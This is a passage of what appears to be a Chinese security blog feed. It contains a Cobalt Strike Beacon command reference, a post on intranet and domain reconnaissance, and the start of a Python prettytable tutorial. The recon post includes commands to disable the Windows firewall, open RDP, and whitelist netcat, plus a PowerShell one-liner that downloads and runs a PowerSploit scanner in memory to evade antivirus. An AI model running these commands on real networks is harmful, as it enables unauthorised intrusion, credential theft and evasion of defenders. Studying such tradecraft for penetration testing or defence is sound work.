切换目录</span><br><span class="line"> checkin 强制让被控端回连一次</span><br><span class="line"> clear 清除beacon内部的任务队列</span><br><span class="line"> connect Connect to a Beacon peer over TCP</span><br><span class="line"> covertvpn 部署Covert VPN客户端</span><br><span class="line"> cp 复制文件</span><br><span class="line"> dcsync 从DC中提取密码哈希</span><br><span class="line"> desktop 远程VNC</span><br><span class="line"> dllinject 反射DLL注入进程</span><br><span class="line"> dllload 使用LoadLibrary将DLL加载到进程中</span><br><span class="line"> download 下载文件</span><br><span class="line"> downloads 列出正在进行的文件下载</span><br><span class="line"> drives 列出目标盘符</span><br><span class="line"> elevate 尝试提权</span><br><span class="line"> execute 在目标上执行程序(无输出)</span><br><span class="line"> execute-assembly 在目标上内存中执行本地.NET程序</span><br><span class="line"> exit 退出beacon</span><br><span class="line"> getprivs Enable system privileges on current token</span><br><span class="line"> getsystem 尝试获取SYSTEM权限</span><br><span class="line"> getuid 获取用户ID</span><br><span class="line"> hashdump 转储密码哈希值</span><br><span class="line"> help 帮助</span><br><span class="line"> inject 在特定进程中生成会话</span><br><span class="line"> jobkill 杀死一个后台任务</span><br><span class="line"> jobs 列出后台任务</span><br><span class="line"> kerberos_ccache_use 从ccache文件中导入票据应用于此会话</span><br><span class="line"> kerberos_ticket_purge 清除当前会话的票据</span><br><span class="line"> kerberos_ticket_use 从ticket文件中导入票据应用于此会话</span><br><span class="line"> keylogger 键盘记录</span><br><span class="line"> kill 结束进程</span><br><span class="line"> link Connect to a Beacon peer over a named pipe</span><br><span class="line"> logonpasswords 使用mimikatz转储凭据和哈希值</span><br><span class="line"> ls 列出文件</span><br><span class="line"> make_token 创建令牌以传递凭据</span><br><span class="line"> mimikatz 运行mimikatz</span><br><span class="line"> mkdir 创建一个目录</span><br><span class="line"> mode dns 使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line"> mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line"> mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line"> mode http 使用HTTP作为通信通道</span><br><span class="line"> mv 移动文件</span><br><span class="line"> net net命令</span><br><span class="line"> note 备注 </span><br><span class="line"> portscan 进行端口扫描</span><br><span class="line"> powerpick 通过Unmanaged PowerShell执行命令</span><br><span class="line"> powershell 通过powershell.exe执行命令</span><br><span class="line"> powershell-import 导入powershell脚本</span><br><span class="line"> ppid Set parent PID for spawned post-ex jobs</span><br><span class="line"> ps 显示进程列表</span><br><span class="line"> p**ec Use a service to spawn a session on a host</span><br><span class="line"> p**ec_psh Use PowerShell to spawn a session on a host</span><br><span class="line"> psinject 在特定进程中执行PowerShell命令</span><br><span class="line"> pth 使用Mimikatz进行传递哈希</span><br><span class="line"> pwd 当前目录位置</span><br><span class="line"> reg Query the registry</span><br><span class="line"> rev2self 恢复原始令牌</span><br><span class="line"> rm 删除文件或文件夹</span><br><span class="line"> rportfwd 端口转发</span><br><span class="line"> run 在目标上执行程序(返回输出)</span><br><span class="line"> runas 以另一个用户权限执行程序</span><br><span class="line"> runasadmin 在高权限下执行程序</span><br><span class="line"> runu Execute a program under another PID</span><br><span class="line"> screenshot 屏幕截图</span><br><span class="line"> setenv 设置环境变量</span><br><span class="line"> shell cmd执行命令</span><br><span class="line"> shinject 将shellcode注入进程</span><br><span class="line"> shspawn 生成进程并将shellcode注入其中</span><br><span class="line"> sleep 设置睡眠延迟时间</span><br><span class="line"> socks 启动SOCKS4代理</span><br><span class="line"> socks stop 停止SOCKS4</span><br><span class="line"> spawn Spawn a session </span><br><span class="line"> spawnas Spawn a session as another user</span><br><span class="line"> spawnto Set executable to spawn processes into</span><br><span class="line"> spawnu Spawn a session under another PID</span><br><span class="line"> ssh 使用ssh连接远程主机</span><br><span class="line"> ssh-key 使用密钥连接远程主机</span><br><span class="line"> steal_token 从进程中窃取令牌</span><br><span class="line"> timestomp 将一个文件时间戳应用到另一个文件</span><br><span class="line"> unlink Disconnect from parent Beacon</span><br><span class="line"> upload 上传文件</span><br><span class="line"> wdigest 使用mimikatz转储明文凭据</span><br><span class="line"> winrm 使用WinRM在主机上生成会话</span><br><span class="line"> wmi 使用WMI在主机上生成会话</span><br><span class="line"> argue 进程参数欺骗</span><br></pre></td></tr></table></figure><h3 id="简单的命令执行"><a href="#简单的命令执行" class="headerlink" title="简单的命令执行"></a>简单的命令执行</h3><p>Beacon中不能直接输入cmd命令，</p><p>如果让目标机执行ipconfig这条cmd命令，对应的Beacon命令是 <code>shell ipconfig</code></p><p>回显的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell +command</span><br></pre></td></tr></table></figure><p>当前目录路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><p>使用powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell +command</span><br></pre></td></tr></table></figure><h3 id="最常用的修改心跳包"><a href="#最常用的修改心跳包" class="headerlink" title="最常用的修改心跳包"></a>最常用的修改心跳包</h3><ul><li>在Cobalt Strike中它的心跳默认是60s（即sleep时间为60s，每一分钟目标主机与teamserver通信一次）</li><li>这会让我们执行命令或进行其他操作响应很慢。</li><li>如果sleep时间过长，在下载文件面前更为明显，所以在测试时会把时间降低一点 。</li><li>我一般先执行sleep 5 ，让相应快一点，但是建议不要太快。如果有下载或者远程VNC这种需要快速网络的 可直接 sleep 0</li></ul><p><img src="https://img-blog.csdnimg.cn/20200315185635329.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习从入门到入狱-知识-内网信息探测与收集</title>
      <link href="/2020/03/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B%E4%B8%8E%E6%94%B6%E9%9B%86/"/>
      <url>/2020/03/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B%E4%B8%8E%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="内网安全学习从入门到入狱-知识-内网信息收集"><a href="#内网安全学习从入门到入狱-知识-内网信息收集" class="headerlink" title="内网安全学习从入门到入狱-知识-内网信息收集"></a>内网安全学习从入门到入狱-知识-内网信息收集</h1><h3 id="内网信息收集-工作组和域内基本信息收集"><a href="#内网信息收集-工作组和域内基本信息收集" class="headerlink" title="内网信息收集-工作组和域内基本信息收集"></a>内网信息收集-工作组和域内基本信息收集</h3><ul><li><p><a href="#_1">内网安全学习从入门到入狱-知识-内网信息收集</a></p></li><li><ul><li><a href="#0x01_14">0x01本机检查–先看看我是谁</a></li><li><ul><li><a href="#_146">查询并开启远程连接服务</a></li></ul></li><li><a href="#0x02_212">0x02域内信息收集</a></li><li><ul><li><a href="#_214">查询当前额权限</a></li><li><a href="#_230">判断是否有域</a></li><li><a href="#_259">查找域控</a></li><li><ul><li><ul><li><a href="#_275">获取域内的用户信息</a></li></ul></li></ul></li></ul></li><li><a href="#0x03__290">0x03 域内网存活主机的探测</a></li><li><ul><li><a href="#_292">主机存活扫描</a></li><li><a href="#_342">域内端口扫描</a></li><li><ul><li><a href="#PowerSploit__InvokePortscanps1__352">PowerSploit 中的 Invoke-Portscan.ps1 脚本</a></li></ul></li></ul></li></ul></li><li><p>前提准备</p></li></ul><p>本文中PowerShell脚本可以自行下载</p><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><h2 id="0x01本机检查–先看看我是谁"><a href="#0x01本机检查–先看看我是谁" class="headerlink" title="0x01本机检查–先看看我是谁"></a>0x01本机检查–先看看我是谁</h2><p>域内的主机一般都是批量的，所以我们看看我们自己，基本上大家也就是差不多的情况</p><p>先看看ip，看看网卡，内外网情况，IP段记录一下，DNS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure><p>查看用户列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p>查看在线的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020031412103628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>查看本机管理员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121107827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>看管理员进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;v</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121140190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>域管理进程 <code>hack\adminishtartor</code></p><p><img src="https://img-blog.csdnimg.cn/20200314121211226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>还有一些常见杀软</p><table><thead><tr><th>360sd…EXE</th><th>360</th></tr></thead><tbody><tr><td>360tray.EXE</td><td>360</td></tr><tr><td>ZHUDONGFANGYU.EXE</td><td>360</td></tr><tr><td>KSAFETRAY.EXE</td><td>金山</td></tr><tr><td>MACAFEE MCSHIELD.EXE</td><td>MacAfee</td></tr><tr><td>AVP.EXE</td><td>K卡巴斯基</td></tr><tr><td>AVGGUARD.EXE</td><td>小红伞</td></tr><tr><td>EGUI.EXE</td><td>Nod32</td></tr></tbody></table><ul><li>查看进程 too</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><ul><li>查看端口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo  或者 wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><ul><li><p>查看共享列表</p><ul><li></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share           wmic share get name,path,status</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121255249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>（1）关闭防火墙<br>Windows Server 2003 系统及之前版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure><p>Windows Server 2003 之后系统版本，命令如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><ul><li>修改防火墙配置<br>Windows Server 2003 系统及之前版本，允许指定程序全部连接，命令如下。<br>netsh firewall add allowedprogram c:\nc.exe “allow nc” enable<br>Windows Server 2003 之后系统版本，情况如下。<br> 允许指定程序连入，命令如下。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow </span><br><span class="line">program&#x3D;&quot;C: \nc.exe&quot;</span><br></pre></td></tr></table></figure><p> 允许指定程序连出，命令如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Allow nc&quot; dir&#x3D;out action&#x3D;allow </span><br><span class="line">program&#x3D;&quot;C: \nc.exe&quot;</span><br></pre></td></tr></table></figure><p>允许 3389 端口放行，命令如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in </span><br><span class="line">  localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure><h3 id="查询并开启远程连接服务"><a href="#查询并开启远程连接服务" class="headerlink" title="查询并开启远程连接服务"></a>查询并开启远程连接服务</h3><p>查看远程连接端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;V PortNumber</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121448325.png" alt="在这里插入图片描述"></p><p>在 Windows Server 2003 中开启 3389 端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><p>在 Windows Server 2008 和 Windows Server 2012 中开启 3389 端口</p><p>一般前两个命令就开启了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName&#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121512501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="12"></p><p>查询域控制器列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Net group &quot;Domain Controller&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><p>收集管理员列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Net group &quot;Domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020031412153313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><ul><li>列出或断开本地计算机和连接的客户端的会话</li><li><code>net session</code></li><li></li></ul><h2 id="0x02域内信息收集"><a href="#0x02域内信息收集" class="headerlink" title="0x02域内信息收集"></a>0x02域内信息收集</h2><h3 id="查询当前额权限"><a href="#查询当前额权限" class="headerlink" title="查询当前额权限"></a>查询当前额权限</h3><ul><li>获取域 SID</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami  &#x2F;all</span><br></pre></td></tr></table></figure><ul><li>查询指定账户的详细信息。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user XXX &#x2F;domain</span><br></pre></td></tr></table></figure><ul><li><h3 id="判断是否有域"><a href="#判断是否有域" class="headerlink" title="判断是否有域"></a>判断是否有域</h3></li></ul><p>主要利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ifconfig &#x2F;all</span><br><span class="line">systeminfo</span><br><span class="line">net view &#x2F;domain   查询域</span><br><span class="line">net view &#x2F;domain:XXX    查询此域内所有计算机</span><br><span class="line">net group &#x2F;domain查询域内所有用户</span><br><span class="line">net config workstation</span><br><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121609472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; &#x2F;domain   查询所有域成员计算机</span><br><span class="line"></span><br><span class="line">net accounts &#x2F;domain  获取域密码信息</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个在大型内网，多个域很重要</span><br><span class="line">获取域信任信息</span><br><span class="line"></span><br><span class="line">nltest &#x2F;domain_trusts</span><br></pre></td></tr></table></figure><h3 id="查找域控"><a href="#查找域控" class="headerlink" title="查找域控"></a>查找域控</h3><p>可以看到域控制器机器名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest &#x2F;DCLIST:hack</span><br></pre></td></tr></table></figure><p>查看域控制器的主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nslookup -type&#x3D;SRV _ldap._tcp</span><br></pre></td></tr></table></figure><h5 id="获取域内的用户信息"><a href="#获取域内的用户信息" class="headerlink" title="获取域内的用户信息"></a>获取域内的用户信息</h5><p>获取域内用户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user &#x2F;domain</span><br></pre></td></tr></table></figure><p>查看存在用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery user</span><br></pre></td></tr></table></figure><h2 id="0x03-域内网存活主机的探测"><a href="#0x03-域内网存活主机的探测" class="headerlink" title="0x03 域内网存活主机的探测"></a>0x03 域内网存活主机的探测</h2><h3 id="主机存活扫描"><a href="#主机存活扫描" class="headerlink" title="主机存活扫描"></a>主机存活扫描</h3><p>内网探测要点</p><ul><li>避免使用大流量攻击的软件和图形化的东西</li><li>避免杀软敏感操作</li><li>尽量使用系统自带的组件</li><li>上班和下班多次扫描，可以进行对比网络情况</li></ul><p>1.利用netbios快速探测内网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Netbios.exe 192.168.0.1&#x2F;24</span><br></pre></td></tr></table></figure><p>2.利用 ICMP 协议快速探测内网—-ping命令主要使用—有的ping不通很正常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&#x3D;&quot;</span><br></pre></td></tr></table></figure><p>3.通过 ARP 扫描探测内网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">arp-scan 工具</span><br><span class="line">Arp.exe –t 192.168.1.0&#x2F;20     </span><br><span class="line"></span><br><span class="line">Nishang 中的 Invoke-ARPScan.ps1扫描</span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\windows\temp\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.0&#x2F;24&#125;&quot; &gt;&gt; C:\windows\temp\log.txt</span><br><span class="line"></span><br><span class="line">Empire 中的 arpsan 模块</span><br><span class="line">usemodule situational_awareness&#x2F;network&#x2F;arpscan</span><br><span class="line">set Range 192.168.1.0-192.168.0.254</span><br><span class="line">execute</span><br></pre></td></tr></table></figure><p>4.利用TCP UDP工具扫描</p><p>ScanLine 是一款经典的端口扫描工具 体积小，动静小</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\log.txt -p 192.168.1.1-254 &#x2F;b</span><br></pre></td></tr></table></figure><h3 id="域内端口扫描"><a href="#域内端口扫描" class="headerlink" title="域内端口扫描"></a>域内端口扫描</h3><p>建议 wmi和powershell工具 动静小好</p><p>S扫描器</p><p>Metasploit 包含多种端口扫描技术，与其他扫描工具接口良好。在 msfconsole 下运行“search portscan”命令，即可进行搜索。</p><h4 id="PowerSploit-中的-Invoke-Portscan-ps1-脚本"><a href="#PowerSploit-中的-Invoke-Portscan-ps1-脚本" class="headerlink" title="PowerSploit 中的 Invoke-Portscan.ps1 脚本"></a>PowerSploit 中的 Invoke-Portscan.ps1 脚本</h4><p>这个强大之处在于是无文件落地的扫描，很强大，</p><p>可以绕过一些杀软</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主要机子要联网能连接到 GitHub这个地址</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Recon&#x2F;Invoke-Portscan.ps1&#39;);Invoke-Portscan -Hosts 192.168.1.0&#x2F;24 -T 4 -ports &#39;445,1433,8080,3389,80&#39; -oA c:\windows\temp\res.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121643894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="12"><br><img src="https://img-blog.csdnimg.cn/20200314121717799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python中prettytable输出美化再加进度条</title>
      <link href="/2020/03/10/Python%E4%B8%ADprettytable%E8%BE%93%E5%87%BA%E7%BE%8E%E5%8C%96%E5%86%8D%E5%8A%A0%E8%BF%9B%E5%BA%A6%E6%9D%A1/"/>
      <url>/2020/03/10/Python%E4%B8%ADprettytable%E8%BE%93%E5%87%BA%E7%BE%8E%E5%8C%96%E5%86%8D%E5%8A%A0%E8%BF%9B%E5%BA%A6%E6%9D%A1/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="Python通过prettytable模块将输出内容如表格输出-比自己那个高端的多了"><a href="#Python通过prettytable模块将输出内容如表格输出-比自己那个高端的多了" class="headerlink" title="- Python通过prettytable模块将输出内容如表格输出 比自己那个高端的多了"></a>- Python通过prettytable模块将输出内容如表格输出 比自己那个高端的多了</h2><ul><li>而且十分简单的使用</li></ul><p>1安装得有吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install PrettyTable</span><br></pre></td></tr></table></figure><p>2导入模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import prettytable as pt</span><br></pre></td></tr></table></figure><p>直接给例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import prettytable as pt</span><br><span class="line"></span><br><span class="line"># 添加表头</span><br><span class="line">table &#x3D; pt.PrettyTable([&quot;URL&quot;, &quot;参数&quot;, &quot;沙雕&quot;])</span><br><span class="line"></span><br><span class="line">#   add_row 添加一行数据</span><br><span class="line">table.add_row([&quot;http:&#x2F;&#x2F;aaa.com&quot;, &quot;raskv&quot;, &quot;123123&quot;])</span><br><span class="line">table.add_row([&quot;http:&#x2F;&#x2F;bbb.com&quot;, &quot;susd&quot;, &quot;123123&quot;])</span><br><span class="line">table.add_row([&quot;http:&#x2F;&#x2F;ccc.com&quot;, &quot;pwd&quot;, &quot;Ym15&quot;])</span><br><span class="line"></span><br><span class="line">#   默认居中对齐</span><br><span class="line">#   设置&quot;值&quot;列，局左对齐 left首字母</span><br><span class="line">table.align[&quot;值&quot;] &#x3D; &#39;l&#39;</span><br><span class="line"></span><br><span class="line">print(table)</span><br></pre></td></tr></table></figure><p>输出，可以哇<br><img src="https://img-blog.csdnimg.cn/20200310182731777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from prettytable import PrettyTable</span><br><span class="line"></span><br><span class="line">table &#x3D; PrettyTable()</span><br><span class="line">#   add_column 添加一列数据</span><br><span class="line">table.add_column(&#39;&#x3D;&#x3D;&#x3D;&#39;, [&quot;URL&quot;, &quot;参数&quot;, &quot;值&quot;])</span><br><span class="line">table.add_column(&#39;第1列&#39;, [&quot;http:&#x2F;&#x2F;aaa.com&quot;, &quot;raskv&quot;, &quot;dEBxcS5j&quot;])</span><br><span class="line">table.add_column(&#39;第2列&#39;, [&quot;http:&#x2F;&#x2F;bbb.com&quot;, &quot;su&quot;, &quot;626d5633583231794c6d4e6&quot;])</span><br><span class="line">table.add_column(&#39;第3列&#39;, [&quot;http:&#x2F;&#x2F;ccc.com&quot;, &quot;pwd&quot;, &quot;Ym1WM1gyMXlMbU5&quot;])</span><br><span class="line">#   设置&quot;第3列&quot;，局右对齐 right首字母</span><br><span class="line">table.align[&quot;第3列&quot;] &#x3D; &#39;r&#39;</span><br><span class="line">print(table)</span><br></pre></td></tr></table></figure><h2 id="进度条"><a href="#进度条" class="headerlink" title="进度条"></a>进度条</h2><p>import time<br>import progressbar</p><h1 id="可以是迭代器或列表"><a href="#可以是迭代器或列表" class="headerlink" title="可以是迭代器或列表"></a>可以是迭代器或列表</h1><figure class="highlight plain"><table><tr><td 